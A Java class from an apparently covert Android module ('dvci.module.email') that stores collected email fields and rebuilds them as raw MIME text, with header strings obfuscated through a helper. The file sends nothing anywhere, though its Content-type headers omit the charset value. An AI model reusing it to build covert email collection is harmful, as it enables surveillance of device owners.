package com.android.dvci.module.email;

import java.util.Date;

import com.android.dvci.util.Utils;
import com.android.mm.M;

public class Email {

	private Date timestamp;
	private String fromAddress;
	private String toAddresses;
	private String ccAddresses;
	private String body;
	private String snippet;
	private String subject;
	private boolean incoming;

	public Email(boolean incoming, Date timestamp, String fromAddress, String toAddresses, String ccAddresses,
			String body, String snippet, String subject) {
		this.timestamp = timestamp;
		this.fromAddress = fromAddress;
		this.toAddresses = toAddresses;
		this.ccAddresses = ccAddresses;
		this.body = body;
		this.snippet = snippet;
		this.subject = subject;
		this.incoming = incoming;
	}

	public String makeMimeMessage(final int maxMessageSize) {
		final StringBuffer mailRaw = new StringBuffer();

		mailRaw.append("Date: " + timestamp.toGMTString() + "\r\n");
		mailRaw.append("From: " + fromAddress + "\r\n");

		mailRaw.append("To: " + toAddresses + "\r\n");
		mailRaw.append("Cc: " + ccAddresses + "\r\n");

		mailRaw.append("Subject: " + subject + "\r\n");

		// comincia la ricostruzione del MIME
		// 18.14=MIME-Version: 1.0
		mailRaw.append(M.e("MIME-Version: 1.0") + "\r\n"); //$NON-NLS-1$
		final long rnd = Math.abs(Utils.getRandom());
		// 18.15=------_NextPart_
		final String boundary = M.e("------_NextPart_") + rnd; //$NON-NLS-1$

		if (isMultipart()) {
			// 18.16=Content-Type: multipart/alternative; boundary=
			mailRaw.append(M.e("Content-Type: multipart/alternative; boundary=") //$NON-NLS-1$
					+ boundary + "\r\n"); //$NON-NLS-1$
			mailRaw.append("\r\n--" + boundary + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}
		//j_19=Content-Transfer-Encoding: quoted-printable
		mailRaw.append(M.e("Content-Transfer-Encoding: 8bit") + "\r\n");
		// 18.17=Content-type: text/plain; charset=UTF8
		mailRaw.append(M.e("Content-type: text/plain; charset") + "\r\n\r\n");
		String msg = snippet;
		if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
			msg = msg.substring(0, maxMessageSize);
		}

		mailRaw.append(msg);

		if (isMultipart()) {
			mailRaw.append("\r\n--" + boundary + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$

			//j_18=Content-type: text/html; charset=UTF8
			//j_19=Content-Transfer-Encoding: quoted-printable
			mailRaw.append(M.e("Content-Transfer-Encoding: 8bit") + "\r\n");
			mailRaw.append(M.e("Content-type: text/html; charset") + "\r\n\r\n");
			// mailRaw.append(htmlMessageContentType);
			
			if (maxMessageSize > 0 && body.length() > maxMessageSize) {
				body = body.substring(0, maxMessageSize);
			}
			mailRaw.append(body);

			mailRaw.append("\r\n--" + boundary + "--\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		mailRaw.append("\r\n"); //$NON-NLS-1$

		final String craftedMail = mailRaw.toString();
		return craftedMail;
	}

	private boolean isMultipart() {
		return body != null;
	}

	public Date getReceivedDate() {
		return timestamp;
	}

	public boolean isIncoming() {
		return incoming;
	}

	public long getDate() {
		return timestamp.getTime();
	}

}
